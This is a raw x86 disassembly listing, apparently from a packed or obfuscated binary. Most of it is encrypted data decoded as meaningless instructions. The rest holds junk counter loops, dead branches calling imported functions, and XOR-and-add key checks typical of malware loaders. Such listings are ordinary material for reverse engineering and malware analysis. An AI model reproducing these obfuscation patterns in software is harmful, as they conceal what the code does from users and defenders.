  41759e:	and    DWORD PTR [edi-0x30],0xa730175c
  4175a5:	(bad)  
  4175a6:	shl    bh,0xe1
  4175a9:	pushf  
  4175aa:	out    0x8,al
  4175ac:	test   al,0xaa
  4175ae:	pop    es
  4175af:	cdq    
  4175b0:	out    0xa8,al
  4175b2:	sub    DWORD PTR [edx],edx
  4175b4:	inc    esp
  4175b5:	pop    ebp
  4175b6:	push   cs
  4175b7:	jl     0x41762c
  4175b9:	retf   
  4175ba:	push   di
  4175bc:	mov    bh,0xc6
  4175be:	pop    edi
  4175bf:	push   cs
  4175c0:	daa    
  4175c1:	fcmovnbe st,st(7)
  4175c3:	outs   dx,BYTE PTR ds:[esi]
  4175c4:	stc    
  4175c5:	call   0xd493:0x8d43ed12
  4175cc:	cmp    bh,BYTE PTR [ebx-0x6265ea0b]
  4175d2:	iret   
  4175d3:	inc    ebx
  4175d4:	inc    eax
  4175d5:	retf   0xd9c6
  4175d8:	ficom  WORD PTR [eax+0x3]
  4175db:	(bad)  
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	sahf   
  4176bb:	mov    bl,0x2e
  4176bd:	and    edi,DWORD PTR [edi+0x2d]
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0xae78787e
  4176c7:	push   ds
  4176c8:	sub    BYTE PTR [ecx+0x524bef9f],al
  4176ce:	scas   al,BYTE PTR es:[edi]
  4176cf:	or     al,0xdc
  4176d1:	add    BYTE PTR [ebx-0x364050e8],al
  4176d7:	adc    DWORD PTR [ecx-0x7592fd61],eax
  4176dd:	push   0xd8da8740
  4176e2:	aaa    
  4176e3:	out    dx,al
  4176e4:	lods   eax,DWORD PTR ds:[esi]
  4176e5:	xor    ebp,DWORD PTR [eax]
  4176e7:	pop    eax
  4176e8:	inc    esp
  4176e9:	push   eax
  4176ea:	dec    edx
  4176eb:	xchg   edx,eax
  4176ec:	stos   DWORD PTR es:[edi],eax
  4176ed:	shl    DWORD PTR [edi+0x3fbff781],0x36
  4176f4:	dec    ebx
  4176f5:	pop    ebp
  4176f6:	iret   
  4176f7:	xor    dh,ah
  4176f9:	loope  0x41776a
  4176fb:	or     BYTE PTR ds:0x85ee3217,dh
  417701:	sbb    eax,0xf1962062
  417706:	mov    ds:0x1876e5f1,al
  41770b:	pop    es
  41770c:	adc    al,0xb7
  41770e:	leave  
  41770f:	pop    es
  417710:	or     DWORD PTR [edi-0x50],ebx
  417713:	pop    es
  417714:	add    eax,0xbb03cf2e
  417719:	adc    bl,0xa0
  41771c:	icebp  
  41771d:	add    BYTE PTR ds:0x7f7ec4bb,dl
  417723:	mov    dh,0xcd
  417725:	sub    al,0x28
  417727:	out    0x1d,al
  417729:	rcr    DWORD PTR [esi-0x419345a3],0x61
  417730:	mov    bh,0x2a
  417732:	icebp  
  417733:	pop    eax
  417734:	imul   ecx,DWORD PTR [ecx-0x46545166],0xfffffff6
  41773b:	out    dx,eax
  41773c:	mov    dl,0x6f
  41773e:	sbb    bh,BYTE PTR [edx+0x66cefa24]
  417744:	mov    edi,0x68d63e0d
  417749:	rol    BYTE PTR [esi+0x1f],0xe5
  41774d:	jo     0x417752
  41774f:	scas   eax,DWORD PTR es:[edi]
  417750:	mov    dh,0x52
  417752:	pop    edx
  417753:	loopne 0x417758
  417755:	rcr    DWORD PTR [ebp+0x6c27ec01],0x10
  41775c:	adc    al,0x3
  41775e:	cld    
  41775f:	or     al,0x46
  417761:	cmp    ecx,DWORD PTR [esi]
  417763:	inc    ebp
  417764:	or     BYTE PTR [eax+0x5aca95dc],dl
  41776a:	push   esi
  41776b:	and    BYTE PTR [ebp+0x101c675c],ah
  417771:	jns    0x417758
  417773:	imul   esi,DWORD PTR [edi-0x70],0x71
  417777:	and    BYTE PTR [edx+0x44b243b4],bl
  41777d:	inc    ebx
  41777e:	pop    esp
  41777f:	xchg   edi,eax
  417780:	inc    esp
  417781:	test   eax,0xb77331d5
  417786:	sti    
  417787:	inc    cx
  417789:	inc    esp
  41778a:	jns    0x4177f8
  41778c:	mov    al,ds:0xd9dbee1f
  417791:	sub    esi,edi
  417793:	inc    ebp
  417794:	cmp    edi,DWORD PTR [edi]
  417796:	mov    bh,0xbe
  417798:	jnp    0x417720
  41779a:	pop    ds
  41779b:	arpl   WORD PTR [esi],sp
  41779d:	fstp   TBYTE PTR [eax]
  41779f:	xchg   BYTE PTR [esi+0x28],dh
  4177a2:	jb     0x417813
  4177a4:	sahf   
  4177a5:	inc    esi
  4177a6:	rcr    edx,0x5b
  4177a9:	je     0x417740
  4177ab:	nop
  4177ac:	fcom   QWORD PTR ds:0x1be4f039
  4177b2:	arpl   WORD PTR [edx+0x3f5a2b52],dx
  4177b8:	mov    ebp,0x21fa621c
  4177bd:	cmp    al,0x6a
  4177bf:	outs   dx,DWORD PTR fs:[esi]
  4177c1:	mov    esp,0xac733145
  4177c6:	xor    BYTE PTR [eax],dl
  4177c8:	jl     0x417764
  4177ca:	push   edx
  4177cb:	sub    ebx,edx
  4177cd:	cmp    edi,DWORD PTR [edi]
  4177cf:	jb     0x41783a
  4177d1:	loope  0x4177b6
  4177d3:	iret   
  4177d4:	and    al,0x7f
  4177d6:	push   ss
  4177d7:	xchg   esp,edi
  4177d9:	aas    
  4177da:	push   0xffffffe1
  4177dc:	call   0x2db8fa7d
  4177e1:	xchg   BYTE PTR [eax],ch
  4177e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e4:	lods   eax,DWORD PTR ds:[esi]
  4177e5:	js     0x417839
  4177e7:	mov    ds:0x8dac33d,eax
  4177ec:	stos   DWORD PTR es:[edi],eax
  4177ed:	mov    edi,0x1c91c8bc
  4177f2:	pop    eax
  4177f3:	xor    eax,0x960b9594
  4177f8:	mov    edx,0x2c048159
  4177fd:	push   esp
  4177fe:	jl     0x417809
  417800:	push   es
  417801:	push   ss
  417802:	pop    ecx
  417803:	xchg   edx,eax
  417804:	push   0xdd2470bd
  417809:	adc    edi,ebp
  41780b:	push   cs
  41780c:	outs   dx,DWORD PTR ds:[esi]
  41780d:	test   al,0x46
  41780f:	mov    edi,0xe752f2
  417814:	es int 0xbd
  417817:	dec    esp
  417818:	sbb    BYTE PTR [ebp+0x23],al
  41781b:	xchg   edx,eax
  41781c:	adc    eax,0xdeb2f22e
  417821:	iret   
  417822:	or     edx,DWORD PTR [ecx-0x4e]
  417825:	mov    WORD PTR [edx+0x5c],?
  417828:	and    al,0x77
  41782a:	and    al,BYTE PTR [esp+esi*8]
  41782d:	jno    0x417802
  41782f:	retf   
  417830:	cli    
  417831:	pop    esi
  417832:	sbb    al,0x4b
  417834:	data16 int3 
  417836:	add    ch,BYTE PTR [ebp+eiz*1+0x1f]
  41783a:	sub    DWORD PTR [ebp+ebx*4-0x34],ebx
  41783e:	gs aaa 
  417840:	(bad)  
  417841:	pusha  
  417842:	in     al,0x17
  417844:	push   0xcfa97c2c
  417849:	cmp    ah,BYTE PTR [eax-0x68]
  41784c:	sbb    esp,esp
  41784e:	adc    dl,BYTE PTR [ebx]
  417850:	xchg   esp,eax
  417851:	das    
  417852:	ins    BYTE PTR es:[edi],dx
  417853:	dec    esi
  417854:	es xor al,0xbc
  417857:	mov    ds:0x7c05e11b,eax
  41785c:	pop    ebp
  41785d:	jecxz  0x41783a
  41785f:	pusha  
  417860:	inc    ecx
  417861:	xchg   edi,eax
  417862:	test   DWORD PTR [ecx+0x3b],esp
  417865:	pop    ebp
  417866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417867:	imul   esp,esp,0x4d
  41786a:	aam    0xad
  41786c:	xor    BYTE PTR [eax],cl
  41786e:	push   cs
  41786f:	xchg   esp,eax
  417870:	in     eax,0xbf
  417872:	call   0x6817:0x594388c9
  417879:	xchg   esp,eax
  41787a:	(bad)  
  41787c:	cmp    DWORD PTR ds:0x35af9ba6,ecx
  417882:	pusha  
  417883:	or     DWORD PTR [ebx],ebp
  417885:	adc    DWORD PTR [edi],edx
  417887:	jns    0x417905
  417889:	pop    ebp
  41788a:	shl    ebx,cl
  41788c:	mov    al,ds:0x57d5553e
  417891:	xor    al,0x36
  417893:	sub    al,0xd6
  417895:	cwde   
  417896:	push   eax
  417897:	adc    eax,0x4e4ec166
  41789c:	pop    eax
  41789d:	cwde   
  41789e:	dec    ecx
  41789f:	arpl   WORD PTR [edi],ax
  4178a1:	test   BYTE PTR [edx+0x4f],ah
  4178a4:	out    0xf3,al
  4178a6:	adc    bl,dl
  4178a8:	push   0x75
  4178aa:	adc    al,0x2a
  4178ac:	out    0x1c,eax
  4178ae:	jmp    0x2279:0xbd09c86d
  4178b5:	ret    
  4178b6:	mov    bh,0x86
  4178b8:	fcom   st(1)
  4178ba:	in     eax,0xa0
  4178bc:	(bad)  
  4178bd:	mov    ah,0xec
  4178bf:	sub    dx,ax
  4178c2:	push   esi
  4178c3:	sub    BYTE PTR [ebx-0x1],bl
  4178c6:	push   0xffffff9f
  4178c8:	cmp    cl,BYTE PTR [ebx+0x2d]
  4178cb:	jae    0x4178b6
  4178cd:	mov    bl,0x4e
  4178cf:	adc    BYTE PTR [edi-0x16c3b7fd],dh
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	mov    al,ah
  4178e7:	add    edi,DWORD PTR [ebx]
  4178e9:	add    al,0x33
  4178eb:	jg     0x417965
  4178ed:	add    eax,0xb778787e
  4178f2:	dec    esi
  4178f3:	mov    dh,0x45
  4178f5:	sar    BYTE PTR [edx-0x2c],1
  4178f8:	out    0xd7,eax
  4178fa:	dec    ebx
  4178fb:	xor    bl,BYTE PTR [edi+0x59a510f9]
  417901:	fstp   QWORD PTR [ebp+eax*1+0x15a7fd52]
  417908:	mov    eax,ds:0xfd4cf785
  41790d:	or     DWORD PTR [esi-0x53],ebp
  417910:	pop    esp
  417911:	mov    ds:0x25f7f097,al
  417916:	push   0x986dcd87
  41791b:	or     BYTE PTR [edx+ebp*4],ah
  41791e:	sbb    bh,ch
  417920:	pop    edi
  417921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417922:	fwait
  417923:	mov    ebx,0xb7419cd
  417928:	jns    0x4179a7
  41792a:	or     dh,BYTE PTR [edx-0x1d]
  41792d:	stc    
  41792e:	cmp    al,0x9
  417930:	jecxz  0x41791f
  417932:	repnz call 0x8626:0xce247538
  41793a:	popf   
  41793b:	push   esp
  41793c:	(bad)  
  41793d:	and    al,0x28
  41793f:	cdq    
  417940:	or     eax,0x474ea570
  417945:	test   eax,0xf052f43d
  41794a:	cmp    eax,0xf83cf032
  41794f:	xor    al,al
  417951:	mov    ch,0xf9
  417953:	pushf  
  417954:	cmp    DWORD PTR [eax+0xc95ef7],esp
  41795a:	pop    es
  41795b:	ja     0x4178fa
  41795d:	inc    edi
  41795e:	ds popa 
  417960:	jnp    0x417916
  417962:	adc    DWORD PTR [eax],0x19
  417965:	(bad)  
  417966:	repnz ss scas al,BYTE PTR es:[edi]
  417969:	in     eax,0xc3
  41796b:	lods   al,BYTE PTR ds:[esi]
  41796c:	xor    al,0xad
  41796e:	adc    DWORD PTR [ebx+ebp*2+0x3324423c],0xc0ff1b7b
  417979:	push   0x2592de94
  41797e:	test   DWORD PTR [edx],ebx
  417980:	xor    dh,ah
  417982:	xor    DWORD PTR [ecx-0xc],esp
  417985:	aam    0x5c
  417987:	and    bh,bl
  417989:	jbe    0x41790e
  41798b:	in     eax,0xc4
  41798d:	inc    ecx
  41798e:	jae    0x417965
  417990:	out    0x78,eax
  417992:	mov    eax,ds:0x8d4dbd77
  417997:	inc    esi
  417998:	ds stos BYTE PTR es:[edi],al
  41799a:	lea    ebp,[esi-0x17278c43]
  4179a0:	adc    al,dl
  4179a2:	and    eax,0x81a26ec4
  4179a7:	(bad)  
  4179a8:	in     al,0x14
  4179aa:	pushf  
  4179ab:	sbb    al,0xdb
  4179ad:	mov    ah,0xcf
  4179af:	adc    al,dh
  4179b1:	adc    al,0xa9
  4179b3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4179b5:	jg     0x417941
  4179b7:	pop    es
  4179b8:	push   esp
  4179b9:	idiv   esi
  4179bb:	mov    esp,0x35b4248f
  4179c0:	pop    ecx
  4179c1:	push   0x3
  4179c3:	nop
  4179c4:	jns    0x41794d
  4179c6:	rol    DWORD PTR [ebp-0x496bd685],0xa0
  4179cd:	retf   0xff6a
  4179d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179d1:	jge    0x4179e7
  4179d3:	inc    ebp
  4179d4:	push   edx
  4179d5:	mov    dl,0x14
  4179d7:	pop    edi
  4179d8:	dec    edi
  4179d9:	daa    
  4179da:	std    
  4179db:	ret    
  4179dc:	or     ah,BYTE PTR [edi+eax*4-0x39a20552]
  4179e3:	adc    al,0x2b
  4179e5:	push   ebx
  4179e6:	aam    0x37
  4179e8:	je     0x9a526047
  4179ee:	cld    
  4179ef:	in     al,0x37
  4179f1:	mov    eax,eax
  4179f3:	sahf   
  4179f4:	jmp    0x417985
  4179f6:	push   ebx
  4179f7:	jle    0x4179ac
  4179f9:	popa   
  4179fa:	inc    esi
  4179fb:	mov    bh,0xd0
  4179fd:	rcr    DWORD PTR [ebp-0xe],0x4b
  417a01:	daa    
  417a02:	mov    ecx,0xbd5c79e8
  417a07:	retf   
  417a08:	leave  
  417a09:	cmp    al,0x24
  417a0b:	mov    esi,0xb0a32bed
  417a10:	add    al,0x6a
  417a12:	ins    DWORD PTR es:[edi],dx
  417a13:	stc    
  417a14:	xor    eax,0x7f5817bd
  417a19:	jge    0x4179e1
  417a1b:	call   0xf323:0xa38aa5ec
  417a22:	xchg   esp,eax
  417a23:	ins    BYTE PTR es:[edi],dx
  417a24:	dec    ebp
  417a25:	pop    ss
  417a26:	repz call 0x6cae:0xd4bcf72b
  417a2e:	test   BYTE PTR [eax],ch
  417a30:	and    DWORD PTR [edx-0x15],0x12
  417a34:	push   edi
  417a35:	(bad)  
  417a36:	mov    dh,0x86
  417a38:	out    0x50,al
  417a3a:	xor    eax,ebx
  417a3c:	xchg   edi,eax
  417a3d:	lods   al,BYTE PTR ds:[esi]
  417a3e:	loopne 0x417a1b
  417a40:	fbstp  TBYTE PTR [eax+esi*1+0x10]
  417a44:	or     eax,DWORD PTR [eax-0x6f]
  417a47:	xlat   BYTE PTR ds:[ebx]
  417a48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a49:	stos   DWORD PTR es:[edi],eax
  417a4a:	cmp    al,0x9c
  417a4c:	jb     0x4179f5
  417a4e:	test   DWORD PTR [edx+edx*4],eax
  417a51:	jmp    esp
  417a53:	addr16 mov ebx,0xd3ed8667
  417a59:	call   0xbb0f:0xa45a7a47
  417a60:	ja     0x4179e6
  417a62:	inc    edx
  417a63:	lods   eax,DWORD PTR ds:[esi]
  417a64:	(bad)  
  417a65:	xchg   edi,eax
  417a66:	jle    0x417a83
  417a68:	mov    edi,0xc001cb08
  417a6d:	inc    esi
  417a6e:	bound  ebp,QWORD PTR [eax-0x12]
  417a71:	pop    eax
  417a72:	cmp    eax,0x9c6a7a9c
  417a77:	inc    edx
  417a78:	(bad)  
  417a79:	ins    DWORD PTR es:[edi],dx
  417a7a:	push   ecx
  417a7b:	fst    DWORD PTR ds:0xc3e690a7
  417a81:	cmp    ah,BYTE PTR [edx+0x2f288820]
  417a87:	inc    esp
  417a88:	dec    edi
  417a89:	bound  edx,QWORD PTR fs:[esi]
  417a8c:	adc    BYTE PTR [eax],ch
  417a8e:	popa   
  417a8f:	jae    0x417a91
  417a91:	(bad)  
  417a92:	push   cs
  417a93:	loopne 0x417a6c
  417a95:	mov    ds:0x857d2503,eax
  417a9a:	adc    al,0xfa
  417a9c:	jno    0x417a68
  417a9e:	jge    0x417ad4
  417aa0:	popf   
  417aa1:	or     ebx,eax
  417aa3:	je     0x417a59
  417aa5:	leave  
  417aa6:	mov    ah,0xaf
  417aa8:	out    0x95,eax
  417aaa:	add    eax,0xebfd2844
  417aaf:	adc    al,0x9b
  417ab1:	xor    eax,0x61847478
  417ab6:	sub    al,0x76
  417ab8:	jno    0x417a41
  417aba:	pop    ebx
  417abb:	pop    ecx
  417abc:	das    
  417abd:	xchg   ecx,eax
  417abe:	popf   
  417abf:	(bad)  
  417ac0:	setnp  BYTE PTR [esi]
  417ac3:	xor    eax,0xad0b0890
  417ac8:	mov    eax,0xe3f4f67f
  417acd:	xor    BYTE PTR [ebx+ecx*2],bh
  417ad0:	mov    WORD PTR [eax+0x78741465],fs
  417ad6:	cmp    al,0xff
  417ad9:	aas    
  417ada:	out    dx,eax
  417adb:	icebp  
  417adc:	mul    al
  417ade:	fdivr  DWORD PTR [ebp+0x4d7605ec]
  417ae4:	push   esp
  417ae5:	mov    eax,0x4c6d4fd1
  417aea:	cdq    
  417aeb:	je     0x417ab8
  417aed:	and    BYTE PTR [edx],ah
  417aef:	(bad)  
  417af0:	fwait
  417af1:	dec    edi
  417af2:	add    DWORD PTR cs:[edi-0x36],ebx
  417af6:	pop    ebx
  417af7:	std    
  417af8:	add    DWORD PTR [esp+ebp*1+0x850ba99],esp
  417aff:	push   ecx
  417b00:	pop    es
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0x1e02356c
  417b49:	scas   eax,DWORD PTR es:[edi]
  417b4a:	adc    DWORD PTR [ecx],esi
  417b4c:	jg     0x417bc6
  417b4e:	add    eax,0x6778787e
  417b53:	nop
  417b54:	dec    edi
  417b55:	idiv   bl
  417b57:	jecxz  0x417bd4
  417b59:	fsub   QWORD PTR [edi-0xe]
  417b5c:	and    BYTE PTR [edx],ah
  417b5e:	test   ebx,ebp
  417b60:	stos   DWORD PTR es:[edi],eax
  417b61:	pushf  
  417b62:	jb     0x417b7b
  417b64:	in     eax,dx
  417b65:	mov    ds:0xe686cfcc,al
  417b6a:	call   0xdae0:0x9fe04fd
  417b71:	test   al,0x60
  417b73:	aas    
  417b74:	push   ds
  417b75:	dec    esi
  417b76:	or     BYTE PTR [edi-0x7ac0682a],al
  417b7c:	xor    ch,dh
  417b7e:	mov    cl,0x2d
  417b80:	jmp    0xd9a9:0xf28f62aa
  417b87:	stos   DWORD PTR es:[edi],eax
  417b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b89:	sbb    eax,0xf3c93d46
  417b8e:	xchg   edx,eax
  417b8f:	push   esp
  417b90:	pop    ecx
  417b91:	push   0x24
  417b93:	in     al,0x5e
  417b95:	mov    WORD PTR [edi+0x38bba963],cs
  417b9b:	popa   
  417b9c:	dec    ebp
  417b9d:	lock inc esp
  417b9f:	mov    DWORD PTR [ebx-0x2f],eax
  417ba2:	adc    eax,0x9e368d76
  417ba7:	pop    ecx
  417ba8:	clc    
  417ba9:	clc    
  417baa:	jle    0x417b92
  417bac:	les    ecx,FWORD PTR [edi]
  417bae:	add    ch,BYTE PTR [edi]
  417bb0:	mov    ?,WORD PTR [esi]
  417bb2:	mov    edi,0x311ef925
  417bb7:	(bad)  
  417bb8:	(bad)  
  417bb9:	out    dx,eax
  417bba:	jle    0x417bce
  417bbc:	clc    
  417bbd:	cmp    ecx,DWORD PTR ds:0x77b1b08b
  417bc3:	pop    ss
  417bc4:	out    dx,eax
  417bc5:	(bad)  
  417bc7:	or     DWORD PTR [ecx],ecx
  417bc9:	jae    0x417b7c
  417bcb:	lock bound eax,QWORD PTR [esi+eax*2-0x67ea8985]
  417bd3:	aas    
  417bd4:	xchg   esi,eax
  417bd5:	fld    DWORD PTR [ebp+ebp*1-0xa01b24a]
  417bdc:	cmp    al,0x4b
  417bde:	lea    ecx,[eax]
  417be0:	dec    edx
  417be1:	xchg   DWORD PTR [ebx+0x44],edi
  417be4:	add    ch,BYTE PTR [esi-0x63]
  417be7:	dec    eax
  417be8:	mov    al,ds:0x98322144
  417bed:	fisttp QWORD PTR [eax+0x44]
  417bf0:	(bad)  
  417bf1:	jmp    0x417bec
  417bf3:	gs std 
  417bf5:	pusha  
  417bf6:	jecxz  0x417c29
  417bf8:	pop    ds
  417bf9:	gs push edx
  417bfb:	retf   0x83f
  417bfe:	and    BYTE PTR [ecx+0x46b5414],0xe0
  417c05:	lahf   
  417c06:	retf   
  417c07:	inc    eax
  417c08:	enter  0xa12b,0xf
  417c0c:	mov    ecx,0xccb1082e
  417c11:	mov    bh,0x6b
  417c13:	sbb    eax,0x6151bc5b
  417c18:	adc    DWORD PTR [esi*4-0x5d21461f],0x2ebd438b
  417c23:	addr16 call 0x32d9:0x92f989ba
  417c2b:	repz out dx,al
  417c2d:	push   ss
  417c2e:	inc    ebp
  417c2f:	inc    ebp
  417c30:	fistp  DWORD PTR [eax]
  417c32:	mov    ds:0x179c95da,al
  417c37:	xchg   ecx,eax
  417c38:	and    BYTE PTR [edi],bl
  417c3a:	pop    ss
  417c3b:	jge    0x417c64
  417c3d:	outs   dx,BYTE PTR ds:[esi]
  417c3e:	mov    BYTE PTR [esi],ch
  417c40:	cmp    eax,0xfa56e8c8
  417c45:	xchg   ebp,eax
  417c46:	pop    esi
  417c47:	cmp    edi,DWORD PTR [ebx-0x6de20999]
  417c4d:	lahf   
  417c4e:	mov    cl,0x4d
  417c50:	(bad)  
  417c51:	mov    bl,0xea
  417c53:	ins    BYTE PTR es:[edi],dx
  417c54:	xchg   esi,eax
  417c55:	je     0x417c93
  417c57:	mov    bh,0x99
  417c59:	mov    WORD PTR [ebx+0x41],ss
  417c5c:	mov    DWORD PTR [ebx+0x74658088],ecx
  417c62:	ss out dx,eax
  417c64:	cmp    BYTE PTR [ebx],al
  417c66:	or     eax,DWORD PTR [ebx]
  417c68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c69:	or     ecx,esi
  417c6b:	enter  0x7832,0xcd
  417c6f:	fs sbb eax,0xaab28259
  417c75:	and    eax,0xba778fa2
  417c7a:	bound  ebx,QWORD PTR [edx]
  417c7c:	fistp  QWORD PTR [ebx+0x63]
  417c7f:	lods   al,BYTE PTR ds:[esi]
  417c80:	out    0xe2,eax
  417c82:	cmp    al,0x1b
  417c84:	sub    eax,0x10be950d
  417c89:	in     eax,dx
  417c8a:	inc    ebx
  417c8b:	pxor   mm2,QWORD PTR [edx]
  417c8e:	scas   al,BYTE PTR es:[edi]
  417c8f:	leave  
  417c90:	fcom   QWORD PTR [edx+ebx*4+0x41631b2f]
  417c97:	fist   DWORD PTR [edi]
  417c99:	cmp    al,0x38
  417c9b:	sbb    DWORD PTR [ebx-0x7c],esi
  417c9e:	push   ebp
  417c9f:	dec    esi
  417ca0:	inc    esi
  417ca1:	loope  0x417c74
  417ca3:	xchg   ebp,eax
  417ca4:	push   eax
  417ca5:	and    ah,BYTE PTR [ecx+0x12]
  417ca8:	mov    ebp,0x4a86bd8b
  417cad:	pop    ss
  417cae:	daa    
  417caf:	xchg   esp,eax
  417cb0:	fcom   QWORD PTR ds:0xffe4e122
  417cb6:	(bad)  
  417cb7:	aad    0xf4
  417cb9:	push   es
  417cba:	jmp    0x417d19
  417cbc:	jge    0x417cb0
  417cbe:	mov    eax,0x7a07f124
  417cc3:	mov    ebp,0xc25643ae
  417cc8:	icebp  
  417cc9:	add    eax,0xd7c365fc
  417cce:	sahf   
  417ccf:	xlat   BYTE PTR ds:[ebx]
  417cd0:	(bad)  
  417cd1:	mov    edi,0xf8585454
  417cd6:	ja     0x417d04
  417cd8:	lea    edi,[edi+edi*1]
  417cdb:	xchg   edi,eax
  417cdc:	dec    ebx
  417cdd:	cmp    DWORD PTR [edx],edi
  417cdf:	hlt    
  417ce0:	xor    DWORD PTR [ecx],edx
  417ce2:	aaa    
  417ce3:	repnz xchg esi,eax
  417ce5:	out    dx,eax
  417ce6:	mov    esi,0xcbc1d540
  417ceb:	enter  0x797d,0x5
  417cef:	adc    BYTE PTR [ecx],cl
  417cf1:	mov    ah,ch
  417cf3:	xchg   edi,eax
  417cf4:	sub    ebx,DWORD PTR cs:[ebp+0x51d14f84]
  417cfb:	dec    ebp
  417cfc:	imul   eax,DWORD PTR [ebx+eax*8+0x6c159ebc],0x8fc77bcd
  417d07:	inc    ecx
  417d08:	jmp    0xa33f:0xef3220f6
  417d0f:	retf   
  417d10:	ss adc al,0x39
  417d13:	or     eax,0x9e106692
  417d18:	mov    eax,ds:0x42050c
  417d1d:	sub    al,0xca
  417d1f:	or     DWORD PTR [eax+0x10],edi
  417d22:	in     eax,0x56
  417d24:	mov    WORD PTR [esi-0x1c3d9e95],ss
  417d2a:	xor    al,al
  417d2c:	sbb    DWORD PTR [esi+0x6f],0x8abc5325
  417d33:	jbe    0x417d76
  417d35:	sbb    eax,0x2b46e2d8
  417d3a:	mov    ds:0xa196d380,eax
  417d3f:	daa    
  417d40:	pop    ebx
  417d41:	xor    al,0xa2
  417d43:	push   eax
  417d44:	(bad)  
  417d46:	ins    DWORD PTR es:[edi],dx
  417d47:	pop    esi
  417d48:	in     eax,dx
  417d49:	cld    
  417d4a:	es inc esi
  417d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d4d:	clc    
  417d4e:	mov    bh,0x59
  417d50:	mov    esp,0xbb40a2ed
  417d55:	pop    esp
  417d56:	in     al,dx
  417d57:	pop    ebp
  417d58:	in     al,dx
  417d59:	sub    DWORD PTR [ebx],esp
  417d5b:	je     0x417cf4
  417d5d:	xor    eax,0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
